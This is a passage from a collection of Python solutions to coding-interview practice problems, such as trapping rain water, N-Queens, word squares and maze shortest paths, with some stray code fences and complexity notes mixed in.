                result += curr
            else:
                curr = 0
        return result

class Solution:
    def thirdMax(self, nums: List[int]) -> int:
        v = [float("-inf"), float("-inf"), float("-inf")]
        for num in nums:
            if not num in v:
                if num > v[0]:
                    v = [num, v[0], v[1]]
                elif num > v[1]:
                    v = [v[0], num, v[1]]
                elif num > v[2]:
                    v = [v[0], v[1], num]
        return v[0] if v[2] == float("-inf") else v[2]

class Solution:
    def addStrings(self, num1: str, num2: str) -> str:
        result = ""
        carry = 0
        i, j = len(num1) - 1, len(num2) - 1
        while i >= 0 or j >= 0 or carry:
            if i >= 0:
                carry += int(num1[i])
                i -= 1
            if j >= 0:
                carry += int(num2[j])
                j -= 1
            carry, curr = divmod(carry, 10)
            result = str(curr) + result
        return result

class Solution:
    def pacificAtlantic(self, matrix: List[List[int]]) -> List[List[int]]:
        if not matrix or not matrix[0]:
            return []
        m, n = len(matrix), len(matrix[0])

        toPacific = set()
        toAtlantic = set()
        directions = [(0, -1), (0, 1), (-1, 0), (1, 0)]

        def search(x, y, oceanSet):
            if (x, y) in oceanSet:
                return
            oceanSet.add((x, y))
            for direction in directions:
                new_x, new_y = x + direction[0], y + direction[1]
                if (
                    0 <= new_x < m
                    and 0 <= new_y < n
                    and matrix[new_x][new_y] >= matrix[x][y]
                ):
                    search(new_x, new_y, oceanSet)

        for i in range(m):
            search(i, 0, toPacific)
            search(i, n - 1, toAtlantic)

        for j in range(n):
            search(0, j, toPacific)
            search(m - 1, j, toAtlantic)

        return [list(pair) for pair in toPacific & toAtlantic]

def digitDegree(n):
    degree = 0
    while len(str(n)) > 1:
        n = sum((int(digit) for digit in str(n)))
        degree += 1
    return degree

def bishopAndPawn(bishop, pawn):
    return abs(ord(bishop[0]) - ord(pawn[0])) == abs(ord(bishop[1]) - ord(pawn[1]))

class Solution:
    def trap(self, height: "List[int]") -> "int":
        result = 0
        stack = []
        for i in range(len(height)):
            while stack and height[i] > height[stack[-1]]:
                pre = stack.pop()
                if stack:
                    h = min(height[stack[-1]], height[i])
                    result += (h - height[pre]) * (i - 1 - stack[-1])
            stack.append(i)
        return result

class Solution:
    def strongPasswordChecker(self, s: str) -> int:
        missing_type = 3
        if any("a" <= c <= "z" for c in s):
            missing_type -= 1
        if any("A" <= c <= "Z" for c in s):
            missing_type -= 1
        if any(c.isdigit() for c in s):
            missing_type -= 1

        change = 0
        one = two = 0
        p = 2
        while p < len(s):
            if s[p - 2] == s[p - 1] == s[p]:
                length = 2
                while p < len(s) and s[p - 1] == s[p]:
                    length += 1
                    p += 1
                change += length // 3
                if length % 3 == 0:
                    one += 1
                elif length % 3 == 1:
                    two += 1
            else:
                p += 1
        if len(s) < 6:
            return max(missing_type, 6 - len(s))
        elif len(s) <= 20:
            return max(missing_type, change)
        else:
            delete = len(s) - 20
            change -= min(delete, one)
            change -= min(max(delete - one, 0), two * 2) // 2
            change -= max(delete - one - 2 * two, 0) // 3

            return delete + max(missing_type, change)

# if result ^ 1 ^ p = z, if z in prefix
# which means we have two numbers p ^ z = result + 1


class Solution:
    def findMaximumXOR(self, nums: List[int]) -> int:
        result = 0
        for i in range(31, -1, -1):
            result <<= 1
            prefixes = {num >> i for num in nums}
            result += any(result ^ 1 ^ p in prefixes for p in prefixes)
        return result

from collections import defaultdict


class Solution:
    def wordSquares(self, words: List[str]) -> List[List[str]]:
        n = len(words[0])
        prefix = defaultdict(list)
        for word in words:
            for i in range(n):
                prefix[word[: i + 1]].append(word)

        result = []

        def dfs(i, path):
            if i == n:
                result.append(path)
                return
            for word in prefix["".join(w[i] for w in path)]:
                dfs(i + 1, path + [word])

        for word in words:
            dfs(1, [word])
        return result
````

````py
# Definition for a Node.
class Node:
    def __init__(self, val, left=None, right=None):
        self.val = val
        self.left = left
        self.right = right```


```py


class Solution:
    def treeToDoublyList(self, root: "Node") -> "Node":
        if not root:
            return root
        dummy = head = Node(0)
        stack, curr, prev = [], root, dummy
        while stack or curr:
            while curr:
                stack.append(curr)
                curr = curr.left
            top = stack.pop()
            prev.right, top.left, prev = top, prev, top
            curr = top.right
        dummy.right.left, prev.right = prev, dummy.right
        return dummy.right
````

````py
# Definition for a Node.
class Node:
    def __init__(self, val=None, children=None):
        self.val = val
        self.children = children```


```py


class Solution:
    def levelOrder(self, root: "Node") -> List[List[int]]:
        if not root:
            return []
        result, queue = [], [root]

        while queue:
            new_queue = []
            level = []
            for node in queue:
                if node:
                    level.append(node.val)
                    new_queue += node.children
            queue = new_queue
            if level:
                result.append(level)
        return result

def bishopAndPawn(bishop, pawn):
    return abs(ord(bishop[0]) - ord(pawn[0])) == abs(ord(bishop[1]) - ord(pawn[1]))

def isBeautifulString(inputString):
    counter = [inputString.count(i) for i in string.ascii_lowercase]
    return counter[::-1] == sorted(counter)

class Solution:
    def multiply(self, num1, num2):
        """
        :type num1: str
        :type num2: str
        :rtype: str
        """
        result = [0] * (len(num1) + len(num2))
        tail = len(result) - 1
        for n1 in reversed(num1):
            temp = tail
            for n2 in reversed(num2):
                result[temp] += int(n1) * int(n2)
                result[temp - 1] += result[temp] // 10
                result[temp] %= 10
                temp -= 1
            tail -= 1
        start = 0
        while start < len(result) - 1 and result[start] == 0:
            start += 1
        return "".join(map(str, result[start:]))

# [ [1,4], [2,3], [3,4] ], the interval with early start might be very long and incompatible with many intervals.
# But if we choose the interval that ends early, we'll have more space left to accommodate more intervals.


class Solution:
    def eraseOverlapIntervals(self, intervals: List[List[int]]) -> int:
        result = 0
        end = float("-inf")
        for interval in sorted(intervals, key=lambda x: x[1]):
            if interval[0] < end:
                result += 1
                continue
            end = interval[1]
        return result

class Solution:
    def findRightInterval(self, intervals: List[List[int]]) -> List[int]:
        if len(intervals) <= 1:
            return [-1]
        L = sorted((interval[0], i) for i, interval in enumerate(intervals))
        result = []

        for interval in intervals:
            idx = bisect.bisect_left(L, (interval[1],))
            result.append(L[idx][1] if idx < len(L) else -1)
        return result

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def pathSum(self, root: TreeNode, sum: int) -> int:
        self.result = 0
        cache = {0: 1}

        def backtrack(node, pathSum):
            if not node:
                return
            pathSum += node.val
            oldSum = pathSum - sum
            if oldSum in cache:
                self.result += cache[oldSum]
            cache[pathSum] = cache.get(pathSum, 0) + 1
            backtrack(node.left, pathSum)
            backtrack(node.right, pathSum)
            cache[pathSum] -= 1

        backtrack(root, 0)
        return self.result

from collections import Counter


class Solution:
    def findAnagrams(self, s: str, p: str) -> List[int]:
        n = len(p)
        p = Counter(p)
        count = len(p)
        start, end = 0, 0
        result = []
        while end < len(s):
            c = s[end]
            if c in p:
                p[c] -= 1
                if p[c] == 0:
                    count -= 1
            end += 1

            while count == 0:
                if end - start == n:
                    result.append(start)
                if s[start] in p:
                    p[s[start]] += 1
                    if p[s[start]] > 0:
                        count += 1
                start += 1
        return result

class Solution:
    def parseTernary(self, expression: str) -> str:
        stack = []
        for c in expression[::-1]:
            if stack and stack[-1] == "?":
                stack.pop()
                a = stack.pop()
                stack.pop()
                b = stack.pop()
                stack.append(a if c == "T" else b)
            else:
                stack.append(c)
        return stack[-1]

def isBeautifulString(inputString):
    for letter in range(ord("a"), ord("z")):
        if inputString.count(chr(letter)) < inputString.count(chr(letter + 1)):
            return False
    return True

class Solution(object):
    def isMatch(self, s, p):
        """
        :type s: str
        :type p: str
        :rtype: bool
        """
        prev = [True]
        for i in range(len(p)):
            prev.append(prev[i] and p[i] == "*")
        for i in range(len(s)):
            curr = [False]
            for j in range(len(p)):
                if p[j] == "*":
                    curr.append(curr[j] or prev[j + 1])
                else:
                    curr.append(prev[j] and p[j] in [s[i], "?"])
            prev = curr
        return prev[-1]

        # dp = [[False]*(len(s) + 1) for _ in range(len(p) + 1)]
        # dp[0][0] = True
        # for i in range(1, len(p) + 1):
        #     dp[i][0] = dp[i-1][0] and p[i-1] == '*'
        # for i in range(len(p)):
        #     for j in range(len(s)):
        #         if p[i] == '*':
        #             dp[i+1][j+1] = dp[i][j+1] or dp[i+1][j]
        #         else:
        #             dp[i+1][j+1] = dp[i][j] and p[i] in [s[j], '?']
        # return dp[-1][-1]

class Solution:
    def findDuplicates(self, nums: List[int]) -> List[int]:
        result = []
        for n in nums:
            if nums[abs(n) - 1] < 0:
                result.append(abs(n))
            else:
                nums[abs(n) - 1] *= -1
        return result
````

````py
Given an array of integers where 1 ≤ a[i] ≤ n (n = size of array), some elements appear twice and others appear once.

Find all the elements of [1, n] inclusive that do not appear in this array.

Could you do it without extra space and in O(n) runtime? You may assume the returned list does not count as extra space.

Example:

Input:
[4,3,2,7,8,2,3,1]

Output:
[5,6]```


```py


class Solution(object):
    def findDisappearedNumbers(self, nums):
        """
        :type nums: List[int]
        :rtype: List[int]
        """
        if not nums:
            return []
        result = []
        for num in nums:
            index = abs(num) - 1
            if nums[index] > 0:
                nums[index] *= -1
        for index, num in enumerate(nums):
            if num > 0:
                result.append(index + 1)
        return result

def buildPalindrome(st):
    for i in range(len(st)):
        sub = st[i : len(st)]
        if sub[::-1] == sub:
            missing = st[0:i]
            return st + missing[::-1]
    return st

class Solution:
    def jump(self, nums: List[int]) -> int:
        if len(nums) <= 1:
            return 0
        jumps = 0
        curr_state, max_state = 0, 0

        for i, v in enumerate(nums[:-1]):
            max_state = max(max_state, i + v)
            if i == curr_state:
                jumps += 1
                curr_state = max_state
            if curr_state >= len(nums) - 1:
                break
        return jumps

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def deleteNode(self, root: TreeNode, key: int) -> TreeNode:
        if not root:
            return root
        elif root.val > key:
            root.left = self.deleteNode(root.left, key)
        elif root.val < key:
            root.right = self.deleteNode(root.right, key)
        else:
            if not root.right:
                return root.left
            if not root.left:
                return root.right
            min_node_val = None
            node = root.right
            while node:
                min_node_val = node.val
                node = node.left
            root.val = min_node_val
            root.right = self.deleteNode(root.right, root.val)
        return root

class Solution:
    def findMinArrowShots(self, points: List[List[int]]) -> int:
        if not points:
            return 0
        points = sorted(points, key=lambda x: x[1])
        result = 1
        end = points[0][1]
        for point in points[1:]:
            if point[0] <= end:
                continue
            end = point[1]
            result += 1
        return result

from collections import defaultdict


class Solution:
    def fourSumCount(self, A, B, C, D):
        """
        :type A: List[int]
        :type B: List[int]
        :type C: List[int]
        :type D: List[int]
        :rtype: int
        """
        ret = 0
        record = defaultdict(lambda: 0)
        for i in range(len(A)):
            for j in range(len(B)):
                record[A[i] + B[j]] += 1
        for i in range(len(C)):
            for j in range(len(D)):
                ss = -(C[i] + D[j])
                if ss in record:
                    ret += record[ss]
        return ret

# Time: O(n^2)
# Space: O(n)


class Solution:
    def find132pattern(self, nums: List[int]) -> bool:
        stack, third = [], float("-inf")
        for n in nums[::-1]:
            if n < third:
                return True
            while stack and stack[-1] < n:
                third = stack.pop()
            stack.append(n)
        return False

class Solution:
    def repeatedSubstringPattern(self, s: str) -> bool:
        ss = (s + s)[1:-1]
        return ss.find(s) != -1

def buildPalindrome(st):
    if st == st[::-1]:  # Check for initial palindrome
        return st
    index = 0
    subStr = st[index:]
    while subStr != subStr[::-1]:  # while substring is not a palindrome
        index += 1
        subStr = st[index:]
    return st + st[index - 1 :: -1]

def electionsWinners(votes, k):
    winners = 0
    current_winner = max(votes)
    for candidate in votes:
        if k > 0 and candidate + k > current_winner:
            winners += 1
        if k == 0 and candidate == current_winner and votes.count(candidate) == 1:
            winners += 1
    return winners

class Solution(object):
    def permute(self, nums):
        """
        :type nums: List[int]
        :rtype: List[List[int]]
        """

        if len(nums) == 0:
            return []
        if len(nums) == 1:
            return [nums]

        result = []
        for index in range(len(nums)):
            for p in self.permute(nums[0:index] + nums[index + 1 :]):
                result.append([nums[index]] + p)

        return result
````

````py
time: O(1)
space: O(1)```


```py


class Solution:
    def hammingDistance(self, x, y):
        """
        :type x: int
        :type y: int
        :rtype: int
        """
        diff = x ^ y
        result = 0
        for _ in range(32):
            result += diff & 1
            diff = diff >> 1
        return result

class Solution:
    def islandPerimeter(self, grid: List[List[int]]) -> int:
        result = 0
        m, n = len(grid), len(grid[0])
        for i in range(m):
            for j in range(n):
                if grid[i][j] == 1:
                    for x, y in [(i + 1, j), (i - 1, j), (i, j - 1), (i, j + 1)]:
                        if x < 0 or x >= m or y < 0 or y >= n or grid[x][y] == 0:
                            result += 1
        return result
````

````py
Without memorization, the time complexity is O(N!)
With memorization, the time complexity is O(2^N)```


```py


class Solution:
    def canIWin(self, maxChoosableInteger: int, desiredTotal: int) -> bool:
        if (maxChoosableInteger + 1) * (maxChoosableInteger / 2) < desiredTotal:
            return False
        cache = {}

        def dfs(choices, target):
            if tuple(choices) in cache:
                return cache[tuple(choices)]
            if choices[-1] >= target:
                return True
            for i in range(len(choices)):
                if not dfs(choices[:i] + choices[i + 1 :], target - choices[i]):
                    cache[tuple(choices)] = True
                    return True
            cache[tuple(choices)] = False
            return False

        return dfs(list(range(1, maxChoosableInteger + 1)), desiredTotal)

def electionsWinners(votes, k):
    max_vote = max(votes)
    len_vote = len(votes)
    if k == 0 and votes.count(max_vote) == 1:
        return 1
    return len([i for i in range(len_vote) if votes[i] + k > max_vote])

def electionsWinners(votes, k):
    winners = 0
    current_winner = max(votes)
    for candidate in votes:
        if k > 0 and candidate + k > current_winner:
            winners += 1
        if k == 0 and candidate == current_winner and votes.count(candidate) == 1:
            winners += 1
    return winners

def isMAC48Address(inputString):
    str_split = inputString.split("-")
    count = 0
    if len(inputString) != 17:
        return False
    if len(str_split) != 6:
        return False
    for i in range(0, 6):
        if str_split[i] == "":
            return False
        if re.search("[a-zG-Z]", str_split[i]):
            count += 1
            if count > 0:
                return False
    return True
````

````py
Time complexity: O(N*N!)```


```py


class Solution:
    def permuteUnique(self, nums: List[int]) -> List[List[int]]:
        result = []
        nums.sort()

        def find(path, A):
            if len(path) == len(nums):
                result.append(path)
                return
            for i in range(len(A)):
                if i > 0 and A[i - 1] == A[i]:
                    continue
                curr = A[i]
                find(path + [curr], A[:i] + A[i + 1 :])

        find([], nums)
        return result

# The rand7() API is already defined for you.
# def rand7():
# @return a random integer in the range 1 to 7


class Solution:
    def rand10(self):
        """
        :rtype: int
        """
        rand = 40
        while rand >= 40:
            rand = (rand7() - 1) * 7 + rand7() - 1
        return rand % 10 + 1

class Solution:
    def findAllConcatenatedWordsInADict(self, words: List[str]) -> List[str]:
        cache, words = {}, set(words)

        def dfs(word):
            if word in cache:
                return cache[word]
            for i in range(1, len(word)):
                prefix, suffix = word[:i], word[i:]
                if (prefix in words and suffix in words) or (
                    prefix in words and dfs(suffix)
                ):
                    cache[word] = True
                    return True
            cache[word] = False
            return False

        return [word for word in words if dfs(word)]

class Solution:
    def makesquare(self, nums: List[int]) -> bool:
        if not nums:
            return False
        if sum(nums) % 4 != 0:
            return False
        nums = sorted(nums, reverse=True)

        def dfs(idx, s, target):
            if idx == len(nums):
                return True
            for i in range(4):
                if s[i] + nums[idx] <= target:
                    s[i] += nums[idx]
                    if dfs(idx + 1, s, target):
                        return True
                    s[i] -= nums[idx]
            return False

        return dfs(0, [0] * 4, sum(nums) // 4)

class Solution:
    def totalHammingDistance(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        bits = [[0, 0] for _ in range(32)]
        for x in nums:
            for i in range(32):
                bits[i][x % 2] += 1
                x = x // 2
        return sum(x * y for x, y in bits)

def isMAC48Address(inputString):
    hex_chars = (
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "0",
        "A",
        "B",
        "C",
        "D",
        "E",
        "F",
        "a",
        "b",
        "c",
        "d",
        "e",
        "f",
    )
    groups = inputString.split("-")
    if len(groups) != 6:
        return False
    if not all((len(group) == 2 for group in groups)):
        return False
    if not all((group[0] in hex_chars and group[1] in hex_chars for group in groups)):
        return False
    return True

class Solution:
    def rotate(self, matrix: List[List[int]]) -> None:
        """
        Do not return anything, modify matrix in-place instead.
        """
        visited = set()
        n = len(matrix)
        for i in range(n):
            for j in range(n):
                if not visited or (i, j) not in visited:
                    matrix[i][j], matrix[j][n - i - 1] = (
                        matrix[j][n - i - 1],
                        matrix[i][j],
                    )
                    visited.add((i, j))
                    visited.add((j, n - i - 1))

from collections import deque


class Solution:
    def licenseKeyFormatting(self, S: str, K: int) -> str:
        ss = "".join(S.split("-")).upper()
        ret = deque()
        i = len(ss)
        while i > 0:
            if i - K <= 0:
                break
            ret.appendleft(ss[i - K : i])
            i -= K
        ret.appendleft(ss[:i])
        return "-".join(ret)

class Solution:
    def findMaxConsecutiveOnes(self, nums: List[int]) -> int:
        result = 0
        start = end = 0
        while end < len(nums):
            if nums[end] == 0:
                result = max(result, end - start)
                start = end
                while start < len(nums) and nums[start] != 1:
                    start += 1
            end += 1
        return max(result, end - start)

from functools import lru_cache


class Solution:
    def findMinStep(self, board: str, hand: str) -> int:
        INF = float("inf")

        def clean(ss):
            i = 0
            for j, ball in enumerate(ss):
                if ball == ss[i]:
                    continue
                if j - i >= 3:
                    return clean(ss[:i] + ss[j:])
                else:
                    i = j
            return ss

        @lru_cache(None)
        def dfs(remain, h):
            remain = clean(remain)
            if remain == "#":
                return 0
            remain_set = set(remain)
            h = "".join(x for x in h if x in remain_set)
            if not h:
                return INF
            result = INF
            for i in range(len(remain)):
                for j, c in enumerate(h):
                    new_h = h[:j] + h[j + 1 :]
                    new_remain = remain[:i] + c + remain[i:]
                    result = min(result, 1 + dfs(new_remain, new_h))
            return result

        result = dfs(board + "#", hand)
        return result if result < INF else -1

from itertools import groupby


def lineEncoding(s):
    s2 = ""
    for k, g in groupby(s):
        l = len(list(g))
        if l == 1:
            s2 += k
        else:
            s2 += str(l) + k
    return s2

from collections import defaultdict


class Solution:
    def groupAnagrams(self, strs):
        """
        :type strs: List[str]
        :rtype: List[List[str]]
        """
        if not strs:
            return []
        d = defaultdict(list)
        for s in strs:
            d["".join(sorted(s))].append(s)
        return list(d.values())

class Solution:
    def hasPath(
        self, maze: List[List[int]], start: List[int], destination: List[int]
    ) -> bool:
        visited = set()

        def dfs(x, y):
            if x == destination[0] and y == destination[1]:
                return True
            for (dx, dy) in [(0, 1), (0, -1), (-1, 0), (1, 0)]:
                new_x, new_y = x + dx, y + dy
                while (
                    0 <= new_x < len(maze)
                    and 0 <= new_y < len(maze[0])
                    and maze[new_x][new_y] == 0
                ):
                    new_x += dx
                    new_y += dy

                new_x -= dx
                new_y -= dy

                if (new_x, new_y) not in visited:
                    visited.add((new_x, new_y))
                    if dfs(new_x, new_y):
                        return True

        return dfs(*start)

class Solution:
    def findSubsequences(self, nums: List[int]) -> List[List[int]]:
        def dfs(idx, path, result):
            if len(path) > 1:
                result.append(path)
            if idx >= len(nums):
                return
            visited = set()
            for i in range(idx, len(nums)):
                if nums[i] in visited:
                    continue
                if not path or path[-1] <= nums[i]:
                    visited.add(nums[i])
                    dfs(i + 1, path + [nums[i]], result)

        result = []
        dfs(0, [], result)
        return result

class Solution:
    def findTargetSumWays(self, nums: List[int], S: int) -> int:
        def dfs(idx, s):
            if (idx, s) not in cache:
                result = 0
                if idx == len(nums):
                    if s == 0:
                        result = 1
                else:
                    result = dfs(idx + 1, s - nums[idx]) + dfs(idx + 1, s + nums[idx])
                cache[(idx, s)] = result
            return cache[(idx, s)]

        cache = {}
        return dfs(0, S)

class Solution:
    def findPoisonedDuration(self, timeSeries: List[int], duration: int) -> int:
        if not timeSeries:
            return 0
        result = 0
        prev = timeSeries[0]
        for t in timeSeries[1:]:
            result += min(duration, t - prev)
            prev = t
        return result + duration

class Solution:
    def __init__(self, rects: List[List[int]]):
        self.rects, self.points, s = rects, [], 0
        for x1, y1, x2, y2 in self.rects:
            s += (x2 - x1 + 1) * (y2 - y1 + 1)
            self.points.append(s)

    def pick(self) -> List[int]:
        x1, y1, x2, y2 = self.rects[
            bisect.bisect_left(self.points, random.randint(1, self.points[-1]))
        ]
        return [random.randint(x1, x2), random.randint(y1, y2)]


# Your Solution object will be instantiated and called as such:
# obj = Solution(rects)
# param_1 = obj.pick()

import heapq


class Solution:
    def findShortestWay(
        self, maze: List[List[int]], ball: List[int], hole: List[int]
    ) -> str:
        m, n = len(maze), len(maze[0])
        ball, hole = tuple(ball), tuple(hole)

        def getNeighbors(loc):
            for dx, dy, direction in [
                (-1, 0, "u"),
                (1, 0, "d"),
                (0, 1, "r"),
                (0, -1, "l"),
            ]:
                x, y, d = loc[0], loc[1], 0
                while 0 <= x + dx < m and 0 <= y + dy < n and not maze[x + dx][y + dy]:
                    x += dx
                    y += dy
                    d += 1
                    if (x, y) == hole:
                        break
                yield d, direction, (x, y)

        q, visited = [(0, "", ball)], set()
        while q:
            d, path, loc = heapq.heappop(q)
            if loc in visited:
                continue
            if loc == hole:
                return path
            visited.add(loc)
            for dist, direction, pos in getNeighbors(loc):
                heapq.heappush(q, (d + dist, path + direction, pos))
        return "impossible"

def lineEncoding(s):
    count = 1
    output = []
    for char in range(1, len(s)):
        if s[char] == s[char - 1]:
            count += 1
        else:
            if count > 1:
                output.append(str(count) + s[char - 1])
            else:
                output.append(s[char - 1])
            count = 1
    if s[len(s) - 1] == s[len(s) - 2]:
        output.append(str(count) + s[len(s) - 1])
    else:
        output.append(s[len(s) - 1])
    return "".join(output)

# 4. Write a Python program to take two numbers from keyboard and find maximum out of them.

x = float(input("Enter the first number: "))
y = float(input("Enter the second number: "))

result = max(x, y)

print("The max of two numbers entered is {}".format(result))
````

````py
Time complexity: O(n^2)```


```py


class Solution:
    def longestPalindrome(self, s):
        """
        :type s: str
        :rtype: str
        """
        result = ""
        for i in range(len(s)):
            odd = self.getPalindrome(i, i, s)
            if len(result) < len(odd):
                result = odd
            even = self.getPalindrome(i, i + 1, s)
            if len(result) < len(even):
                result = even
        return result

    def getPalindrome(self, l, r, s):
        while l >= 0 and r < len(s) and s[l] == s[r]:
            l -= 1
            r += 1
        return s[l + 1 : r]

import itertools as t


def chessKnight(cell):
    knight_dir = list(t.permutations([1, 2, -1, -2], 2))
    knight_dir1 = []
    valid_moves = 0
    for i in range(len(knight_dir)):
        if sum(knight_dir[i]) != 0:
            knight_dir1.append(knight_dir[i])
    for x, y in knight_dir1:
        if (97 <= ord(cell[0]) + x <= 104) and (1 <= int(cell[1]) + y <= 8):
            valid_moves += 1
    return valid_moves

# time: log(n)
# space: log(n)


class Solution:
    def myPow(self, x: float, n: int) -> float:
        if n == 0:
            return 1
        if n < 0:
            if n == -2147483648:
                n += 2
            n = -n
            x = 1 / x
        return (
            self.myPow(x * x, n // 2) if n % 2 == 0 else x * self.myPow(x * x, n // 2)
        )

import heapq


class Solution:
    def shortestDistance(
        self, maze: List[List[int]], start: List[int], destination: List[int]
    ) -> int:
        m, n = len(maze), len(maze[0])
        start, destination = tuple(start), tuple(destination)
        q, visited = [(0, start)], set(start)

        def getNeighbor(x, y):
            for direction in [(-1, 0), (1, 0), (0, 1), (0, -1)]:
                i, j, d = x, y, 0
                while (
                    0 <= i + direction[0] < m
                    and 0 <= j + direction[1] < n
                    and maze[i + direction[0]][j + direction[1]] == 0
                ):
                    i += direction[0]
                    j += direction[1]
                    d += 1
                yield (i, j), d

        while q:
            d, curr = heapq.heappop(q)
            if curr == destination:
                return d
            if curr in visited:
                continue
            visited.add(curr)
            for neighbor, distance in getNeighbor(*curr):
                heapq.heappush(q, (d + distance, neighbor))
        return -1

class Solution:
    def fib(self, N: int) -> int:
        if N < 2:
            return N
        s1, s2 = 0, 1
        for _ in range(1, N):
            s = s1 + s2
            s1, s2 = s2, s
        return s2

def chessKnight(cell):
    moves = 0
    # Starting at the top left, going counter-clockwise
    if ord(cell[0]) >= ord("b") and ord(cell[1]) <= ord("6"):
        moves += 1
    if ord(cell[0]) >= ord("c") and ord(cell[1]) <= ord("7"):
        moves += 1
    if ord(cell[0]) >= ord("c") and ord(cell[1]) >= ord("2"):
        moves += 1
    if ord(cell[0]) >= ord("b") and ord(cell[1]) >= ord("3"):
        moves += 1
    if ord(cell[0]) <= ord("g") and ord(cell[1]) >= ord("3"):
        moves += 1
    if ord(cell[0]) <= ord("f") and ord(cell[1]) >= ord("2"):
        moves += 1
    if ord(cell[0]) <= ord("f") and ord(cell[1]) <= ord("7"):
        moves += 1
    if ord(cell[0]) <= ord("g") and ord(cell[1]) <= ord("6"):
        moves += 1

    return moves

def deleteDigit(n):
    num = str(n)
    result = list(int("".join(num[:i] + num[1 + i :])) for i in range(len(num)))
    return max(result)
````

````py
Time: O(n^n)
Space: O(n^2)```


```py


class Solution:
    def solveNQueens(self, n):
        """
        :type n: int
        :rtype: List[List[str]]
        """

        def dfs(row):
            if row == n:
                ret.append(["".join(r) for r in chessboard])
                return
            for col in range(n):
                if isValid(row, col):
                    chessboard[row][col] = "Q"
                    dfs(row + 1)
                    chessboard[row][col] = "."

        def isValid(row, col):
            for i in range(row):
                for j in range(n):
                    if chessboard[i][j] == "Q" and (
                        col == j or row - col == i - j or row + col == i + j
                    ):
                        return False
            return True

        chessboard = [["."] * n for i in range(n)]
        ret = []
        dfs(0)
        return ret
````

````py
# Definition for a Node.
class Node:
    def __init__(self, val):
        self.val = val
        self.left = None
        self.right = None
        self.parent = None```


```py

# Time: O(log N)
class Solution:
    def inorderSuccessor(self, node: "Node") -> "Node":
        if node.right:
            node = node.right
            while node.left:
                node = node.left
            return node

        while node.parent and node.parent.val < node.val:
            node = node.parent
        return node.parent

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right


class Solution:
    def findBottomLeftValue(self, root: TreeNode) -> int:
        queue = [root]
        while queue:
            leftmost = queue[0].val
            queue = [
                child for node in queue for child in [node.left, node.right] if child
            ]
        return leftmost

from collections import defaultdict


class Solution:
    def findRotateSteps(self, ring: str, key: str) -> int:
        d = defaultdict(list)
        for i, c in enumerate(ring):
            d[c].append(i)

        def getDistance(i, j):
            n = abs(j - i)
            return min(n, len(ring) - n)

        state = {0: 0}
        for c in key:
            new_state = {}
            for i in state:
                for j in d[c]:
                    if j not in new_state:
                        new_state[j] = state[i] + getDistance(i, j)
                    else:
                        new_state[j] = min(new_state[j], state[i] + getDistance(i, j))
            state = new_state
        return min(state.values()) + len(key)

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right


class Solution:
    def largestValues(self, root: TreeNode) -> List[int]:
        if not root:
            return []
        result = []
        queue = [root]

        while queue:
            result.append(max(node.val for node in queue))
            queue = [
                child for node in queue for child in [node.left, node.right] if child
            ]
        return result

class Solution:
    def longestPalindromeSubseq(self, s: str) -> int:
        N = len(s)
        dp = [[0] * N for _ in range(N)]
        for i in range(N):
            for j in range(N):
                if i == j:
                    dp[i][j] = 1

        for d in range(1, N):
            for i in range(N - d):
                j = i + d
                if s[i] == s[j]:
                    dp[i][j] = dp[i + 1][j - 1] + 2
                else:
                    dp[i][j] = max(dp[i + 1][j], dp[i][j - 1])
        return dp[0][N - 1]

def deleteDigit(n):
    num = str(n)
    highest = 0
    for digit in range(len(num)):
        output = num[:digit] + num[digit + 1 :]
        if int(output) > int(highest):
            highest = output
    return int(highest)

def longestWord(text):
    word_split = re.findall(r"[\w']+", text)
    longest_word = ""
    for word in word_split:
        if len(word) > len(longest_word) and word.isalpha():
            longest_word = word
    return longest_word
````

````py
Time: O(n!)
Space: O(n)```


```py


class Solution:
    def totalNQueens(self, n):
        """
        :type n: int
        :rtype: int
        """
        self.ret = 0
        self.dfs([-1] * n, 0)
        return self.ret

    def dfs(self, b, r):
        if len(b) == r:
            self.ret += 1
            return
        for c in range(len(b)):
            b[r] = c
            if self.isValid(b, r):
                self.dfs(b, r + 1)

    def isValid(self, b, r):
        for i in range(r):
            if b[i] == b[r] or abs(b[r] - b[i]) == r - i:
                return False
        return True

class Solution:
    def detectCapitalUse(self, word: str) -> bool:
        if word.isupper() or word.islower():
            return True
        return word[0].isupper() and word[1:].islower()

class Solution:
    def checkSubarraySum(self, nums: List[int], k: int) -> bool:
        d = {0: -1}
        total, m = 0, 0
        for i in range(len(nums)):
            total += nums[i]
            if k != 0:
                m = total % k
            else:
                m = total
            if m in d:
                if i - d[m] > 1:
                    return True
            else:
                d[m] = i
        return False

class Solution:
    def countArrangement(self, N: int) -> int:
        def count(i, X):
            if i == 1:
                return 1
            return sum(count(i - 1, X - {x}) for x in X if x % i == 0 or i % x == 0)

        return count(N, set(i for i in range(1, N + 1)))

from collections import defaultdict


class Solution:
    def wordsAbbreviation(self, dict: List[str]) -> List[str]:
        def get_prefix(w1, w2):
            i = 1
            while i < len(w1) and i < len(w2) and w1[i] == w2[i]:
                i += 1
            return i

        result = [None] * len(dict)

        groups = defaultdict(list)
        for idx, word in enumerate(dict):
            groups[(len(word), word[0], word[-1])].append((word, idx))

        for key, vals in groups.items():
            size, start, end = key[0], key[1], key[2]
            vals.sort()

            word_prefix = [0] * len(vals)
            for i in range(len(vals)):
                if i == 0:
                    continue
                w1, w2 = vals[i - 1][0], vals[i][0]
                prefix = get_prefix(w1, w2)

                word_prefix[i - 1] = max(word_prefix[i - 1], prefix)
                word_prefix[i] = max(word_prefix[i], prefix)

            for ((word, idx), p) in zip(vals, word_prefix):
                diff = size - 2 - p
                if diff >= 2:
                    result[idx] = word[: p + 1] + str(diff) + end
                else:
                    result[idx] = word
        return result

import random

from typing import List


class Solution:
    def __init__(self, w: List[int]):
        self.w = w
        self.total = sum(w)
        for i in range(1, len(w)):
            self.w[i] += self.w[i - 1]

    def pickIndex(self) -> int:
        r = random.randint(1, self.total)
        start, end = 0, len(self.w) - 1
        while start < end:
            mid = (start + end) // 2
